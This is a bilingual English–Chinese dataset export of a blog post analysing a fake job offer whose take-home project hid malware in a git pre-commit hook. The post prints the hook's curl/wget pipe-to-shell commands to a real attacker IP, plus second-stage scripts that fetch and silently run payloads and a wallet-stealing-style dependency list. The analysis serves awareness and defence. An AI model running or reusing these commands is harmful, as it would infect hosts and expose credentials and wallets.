blocks.html_en: That’s it for now. Feel free to connect with me on LinkedIn if you want to chat, though maybe skip sending any malware-laced take-home tests. (Actually, on second thought, if you have interesting malware samples, send ‘em over!)

sentences.en: That’s it for now.
sentences.zh: 现在就这样。

sentences.en: Feel free to connect with me on LinkedIn if you want to chat, though maybe skip sending any malware-laced take-home tests.
sentences.zh: 如果您想聊天，请随时在 LinkedIn 上与我联系，不过您可以跳过发送任何带有恶意软件的带回家的测试。

sentences.en: (Actually, on second thought, if you have interesting malware samples, send ‘em over!)
sentences.zh: （实际上，再想一想，如果您有有趣的恶意软件样本，请将其发送过来！）

blocks.html_en: Thanks for reading!

sentences.en: Thanks for reading!
sentences.zh: 感谢您的阅读！

content_html_zh:
在 Hacker News 或 LinkedIn 上进行讨论。

上周四，一位招聘人员以 Python 开发人员的身份闯入了我的 LinkedIn 私信。 我很高兴有人直接联系我，所以我询问了更多细节。 当他分享职位描述、公司名称和预估薪资时，我想我没有什么可失去的。

这是最初的消息：

对于远程优先、合同聘用的职位，每月提供 10,000 至 15,000 美元的薪水实在太好了。 另外，为什么这个家伙在我们见面之前就透露了薪酬信息？ 我认为招聘人员玩的是“你先，我其次”的游戏。 菜鸟错误。

红旗立即开始飘扬。 为何预算如此庞大？ （好吧，按照印度的远程角色标准来看，这个数字是巨大的；按照美国的标准来看，这并不完全令人震惊，但也足以引起人们的注意。） 我查了一下这家公司，发现这是一家 Y Combinator 初创公司。 YC 公司并不以传统运营而闻名，因此这并非完全不可能。 不过，如果一家公司有足够的现金可以挥霍，他们通常会有一个更加结构化的招聘渠道。 我决定继续，但仍保持警惕。

我把简历发过来了。 招聘人员很快批准了它，并通过 Google Drive 链接移交了一份带回家的作业，其中包含 zip 存档和带有说明的 PDF。 这是原始驱动器链接：https://drive.google.com/drive/folders/18i1KDFXAPv7lqfBGddxj7IOnDy8J6VeH?usp=drive_link。我在这里制作了副本，以防他们删除自己的副本：https://drive.google.com/drive/folders/1DZYWezjpwolsxXnM5F04_Ng3nzTRYpVS?usp=sharing。

评估 PDF 看起来出奇地合法。 是关于如何改进现有的代码库、架构建议、一些 git 操作等。

我解压了拉链。 乍一看，它只是一个使用 SQLAlchemy 的样板 FastAPI 后端；非常标准的东西。 我检查了requirements.txt中是否有任何明显的误植或恶意软件包，但它是完全干净的。 有那么一瞬间，我认为我的怀疑毫无根据，这是一个合理的机会。

这只是一个习惯（可能来自于做CTF），每当我得到一个随机的项目文件夹时，我只是运行tree -a来看看隐藏目录中潜伏着什么。 但这可能是第一次在现实世界中得到回报。

❯ tree -a .
.
├── alembic.ini
├── for learning
│   ├── dtos.py
│   ├── main.py
│   └── mockData.py
├── .git
│   ├── config
│   ├── description
│   ├── gk
│   │   └── config
│   ├── HEAD
│   ├── hooks
│   │   ├── applypatch-msg
│   │   ├── commit-msg
│   │   ├── fsmonitor-watchman
│   │   ├── post-applypatch
│   │   ├── post-checkout
│   │   ├── post-commit
│   │   ├── post-merge
│   │   ├── post-receive
│   │   ├── post-rewrite
│   │   ├── post-update
│   │   ├── pre-applypatch
│   │   ├── pre-auto-gc
│   │   ├── pre-commit
│   │   ├── pre-merge-commit
│   │   ├── prepare-commit-msg
│   │   ├── pre-push
│   │   ├── pre-rebase
│   │   ├── pre-receive
│   │   ├── proc-receive
│   │   ├── push-to-checkout
│   │   ├── sendemail-validate
│   │   └── update
│   ├── index
│   ├── info
│   │   └── exclude
│   ├── logs
...

等一下。 存储库中预先配置了大量的 Git 挂钩。 我打开预提交脚本来查看他们试图运行的内容。


❯ cat .git/hooks/pre-commit
#!/bin/sh

case "$(uname -s)" in
  Darwin*) curl -sL 'http://45.61.164.38:5777/task/mac?id=402' -L | sh > /dev/null 2>&1 & ;;
  Linux*) wget -qO- 'http://45.61.164.38:5777/task/linux?id=402' -L | sh > /dev/null 2>&1 & ;;
  MINGW*|MSYS*|CYGWIN*) curl -sL http://45.61.164.38:5777/task/windows?id=402 -L | cmd > /dev/null 2>&1 & ;;
  *)        curl -sL 'http://45.61.164.38:5777/task/mac?id=402' -L | sh > /dev/null 2>&1 & ;;
esac

宾果游戏。 他们嵌入了一个脚本，用于检查受害者的主机操作系统并静默执行远程有效负载。

旁注：为什么使用原始 IP 地址？ 如果有的话，这就是“恶意软件”。 至少注册一个诱饵域名，如 lint-checker.com 或 jenkins-ci-runner.net。 如果写这篇文章的威胁行为者正在阅读：请记下笔记！

让我们看看 Linux 负载实际上做了什么。 请注意 id=402 参数被传递到端点。 请记住这一点。

❯ curl http://45.61.164.38:5777/task/linux?id=402
#!/bin/bash
set -e
echo "Authenticated"
TARGET_DIR="$HOME/Documents"
clear
wget -q -O "$TARGET_DIR/tokenlinux.npl" "http://45.61.164.38:5777/task/tokenlinux?id=402"
clear
mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
clear
chmod +x "$TARGET_DIR/tokenlinux.sh"
clear
nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
clear
exit 0

该脚本会拉取最初名为 tokenlinux.npl 的辅助有效负载（稍后我们将回到该特定扩展）。 然后，它将文件隐藏在我的 ~/Documents 目录中，命名为 tokenlinux.sh，使其可执行，并使用 nohup 在后台将其关闭。

来自 Google：nohup 命令（“nohang up”的缩写）是一个 Linux/Unix 实用程序，即使在您注销、关闭终端或从 SSH 会话断开连接后，该实用程序仍能让进程保持运行。

我们沿着兔子洞走下去。 让我们检查下一个脚本。


❯ curl http://45.61.164.38:5777/task/tokenlinux?id=402
...
...
BASE_URL="http://45.61.164.38:5777"
...

# Step 8: Download files

# Check if curl is available

if ! command -v curl >/dev/null 2>&1; then
# If curl is not available, use wget
wget -q -O "$USER_HOME/parser.js" "$BASE_URL/task/parser?id=402"
wget -q -O "$USER_HOME/package.json" "$BASE_URL/task/json"
else
# If curl is available, use curl
curl -s -L -o "$USER_HOME/parser.js" "$BASE_URL/task/parser?id=402"
curl -s -L -o "$USER_HOME/package.json" "$BASE_URL/task/json"
fi

# Step 9: Install 'request' package

cd "$USER_HOME"
if [ ! -d "node_modules/request" ]; then
npm install --silent --no-progress --loglevel=error --fund=false
fi

# Step 10: Run token parser

if [ -f "$USER_HOME/parser.js" ]; then
nohup node "$USER_HOME/parser.js" > "$USER_HOME/parser.log" 2>&1 &
else
exit 1
fi
exit 0
为了简洁起见，我已将输出修剪为最有趣的部分，但如果您想更深入地了解，可以在此处获取完整文件：parser.js。

第二阶段做了很多繁重的工作。 它会悄悄地安装 Node.js，配置系统路径，下载 package.json 和 parser.js 文件，安装所需的依赖项，然后以不可见的方式运行解析器。

我查看了 parser.js。 代码非常混乱，手动阅读时一团糟。 还记得 id 参数吗？ 我尝试在请求中更改它，并收到了完全不同的脚本。 攻击者可能会分配唯一的标识符来跟踪各个候选人，为每个受害者提供定制的有效负载。

由于 parser.js 是一堵砖墙，所以我转向了 package.json。 与解析器不同，这必须是标准 JSON，npm 才能处理它。


❯ curl http://45.61.164.38:5777/task/json

{
        "name": "tokendapp",
        "version": "1.0.0",
        "devDependencies": {
                "hardhat": "^2.20.2"
        },
        "dependencies": {
                "axios": "^1.12.2",
                "basic-ftp": "^5.0.5",
                "child_process": "^1.0.2",
                "clipboardy": "^4.0.0",
                "crypto": "^1.0.1",
                "execp": "^0.0.1",
                "fs": "^0.0.1-security",
                "jsonwebtoken": "^9.0.2",
                "process": "^0.11.10",
                "ps-node": "^0.1.6",
                "request": "^2.88.2"
        },
        "scripts": {
                "test": "npx hardhat test",
                "deploy": "npx hardhat run scripts/deploy.js"
        }
}

这些依赖关系非常可疑。 为什么后台设置任务需要剪贴板访问（clipboardy），并且它们也需要文件系统访问（fs）。 安全帽到底是什么？

啊，以太坊开发环境。 这使得跟踪 ID 参数更加令人好奇。 如果他们放弃比特币矿工，将特定的哈希任务分配给唯一的 ID 是有意义的。 但以太坊放弃了工作量证明；它不再依赖采矿。 他们可能使用 Hardhat 来定位和耗尽加密钱包或与本地浏览器扩展进行交互？ 我不知道。

为了对 parser.js 进行反混淆，我将代码扔给了几个 LLM，看看他们是否可以解开它。

克劳德看了一眼文件，触发了安全栏，拒绝分析脚本：

另一方面，双子座则非常乐意将其分解：

早些时候，我们看到了最初名为 tokenlinux.npl 的有效负载。 快速搜索可以准确确认哪种威胁行为者使用该扩展：

骗局越陷越深

在意识到这是一场广泛的活动后，我做了更多的挖掘，发现人们正在遭受这种攻击的不同变体。 有些人收到了一个包含 .vscode 文件夹的 zip 文件。 在内部，攻击者隐藏了配置为在 VSCode 中打开目录后立即运行的命令（启动命令）。

相当聪明。

你甚至不需要运行 git 命令，只需在 VSCode 中打开这个目录就足以被感染。

而且，现在很明显这与 Zavopay 无关。 攻击者只是使用他们发现的任何公司名称来使报价看起来合法。 出于好奇，我运行 git log 来检查项目的提交历史记录，想知道它们是否留下了任何自定义痕迹。 事实证明，他们只是克隆了一个随机的公共存储库。

❯ git log
commit 16a25d9eaef7ef2e831a21ca0d703fe0fa621492 (HEAD -> main, origin/main, origin/feature/payment, origin/HEAD, feature/payment)
Author: rhonda <womenofinspiration2016@gmail.com>
Date:   Mon Jun 29 22:04:17 2026 -0400

commit 8ae96928302a8e0757f2c72f85c46d801c97b91e
Merge: f64c289 d6cb1f2

快速搜索让我直接找到了原始存储库：https://github.com/Bgogoi123/personal-finance-service。他们实际上只是拿走了某人无辜的 FastAPI 项目，并在其上放置了一个恶意的隐藏目录。

自然，下一步就是由守转攻。 我想看看攻击者是否在其 IP 上留下了任何易受攻击的服务。

Nmap 扫描显示三个开放端口。 其中两个对版本检测没有响应。 端口 22 在 Ubuntu 上运行 OpenSSH 9.6p1。 由于该版本是在本次扫描前一周发布的，因此我没有可以利用的已知 CVE 来研究他们的基础设施。

因此，他们的服务器上有不错的 OPSEC，即使他们的恶意软件部署有点吵。 这就是目前线索变冷的地方。 在外面保持安全，并在运行别人的代码之前始终检查那些隐藏的目录。

现在我明白为什么他们的作业 PDF 有 git 任务了。 他们希望确保候选人至少运行一个 git 命令，这样钩子就会被触发。

哦，顺便说一句，在我打电话给他们的前线后，“招聘人员”似乎已经删除了该帐户。

现在就这样。 如果您想聊天，请随时在 LinkedIn 上与我联系，不过您可以跳过发送任何带有恶意软件的带回家的测试。 （实际上，再想一想，如果您有有趣的恶意软件样本，请将其发送过来！）

感谢您的阅读！
